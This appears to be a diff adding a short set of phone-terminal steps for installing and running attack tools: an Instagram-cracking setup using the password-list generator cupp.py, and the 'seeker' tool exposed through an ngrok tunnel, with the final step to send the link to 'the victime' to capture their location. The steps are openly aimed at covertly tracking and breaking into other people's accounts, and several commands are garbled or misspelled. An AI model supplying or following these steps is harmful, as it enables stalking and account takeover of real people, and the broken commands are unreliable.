@@ -1,0 +1,33 @@
+Location tracking commands:
+1. Pkg update 
+2. Pkg upgrade
+3. Pkg install python
+4. Pkg install git
+5. Git clone copy link
+6. Ls
+7. Cd crak insta
+8. Ls chmod +X
+9. Ls 
+10. Pip install requests 
+11. Pip install bs4
+12. Ls 
+13. Python3 cupp.py
+
+Another one commands for seeker tool:
+1. Pkg update 
+2. Pkg upgrade
+3. Pkg install python
+4. Pkg install git
+5. Git clone copy link
+6. Ls
+7. Cd seeker
+8. Ls
+9. ./seeker- optional
+10. ./seeker.py
+11. ./seeker.py –h
+12. ./seeker.py –t manual
+13. Select 1
+14. Open new session for NGROK
+15. ./ngrok https 8080
+16. Copy link
+17. Send to the victime
